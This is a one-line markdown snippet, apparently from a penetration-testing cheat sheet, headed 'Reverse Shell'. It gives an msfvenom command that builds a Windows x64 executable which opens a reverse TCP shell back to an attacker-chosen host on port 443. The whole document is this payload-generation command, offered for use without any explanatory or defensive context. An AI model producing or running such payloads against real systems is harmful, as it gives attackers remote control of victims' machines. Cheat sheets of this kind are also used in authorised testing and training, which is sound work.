#### Reverse Shell
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -o shell.exe
```

